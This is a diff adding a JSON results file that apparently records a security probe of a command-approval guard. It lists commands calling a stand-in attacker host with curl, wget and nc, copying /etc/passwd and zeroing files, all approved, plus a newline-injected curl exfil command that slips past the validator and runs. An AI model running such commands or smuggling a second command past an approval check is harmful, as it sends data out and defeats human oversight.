@@ -1,0 +1,105 @@
+{
+  "stage_0_blast_radius": {
+    "id": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "whoami": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "touch /tmp/r3-pwned": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "mkdir -p /tmp/r3-pwned": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "curl -sS http://attacker.invalid/exfil": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "curl -o /tmp/x http://attacker.invalid/x": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "wget http://attacker.invalid/x": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "nc attacker.invalid 4444": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "ssh user@host": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "scp /etc/hosts user@host:/tmp": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "cp /etc/passwd /tmp/r3": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "dd if=/dev/zero of=/tmp/x": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "python3 -m http.server 9999": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "crontab -l": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    },
+    "open -a Calculator": {
+      "approved": true,
+      "guard_verdict": null,
+      "why": ""
+    }
+  },
+  "stage_1_validator": {
+    "approved_entry": "./probe.sh payments",
+    "proposed_command": "./probe.sh payments\ncurl -sS http://attacker.invalid/exfil",
+    "command_guard_verdict": null,
+    "ApprovedCommands.approves": {
+      "ok": true,
+      "why": ""
+    }
+  },
+  "stage_2_validate_and_compile": {
+    "validate_scenario_reasons": [],
+    "compiled_CommandSpec_run": "./probe.sh payments\ncurl -sS http://attacker.invalid/exfil",
+    "raw_newline_preserved": true
+  },
+  "stage_3_shell": {
+    "strings_handed_to_ProcessRunner_run": [
+      "./probe.sh payments\ncurl -sS http://attacker.invalid/exfil",
+      "./probe.sh payments",
+      "./probe.sh reset"
+    ]
+  },
+  "stage_4_shell_semantics": {
+    "payload": "echo FIRST\necho R3-SECOND-COMMAND-RAN",
+    "stdout": "FIRST\nR3-SECOND-COMMAND-RAN\n",
+    "both_commands_ran": true
+  }
+}
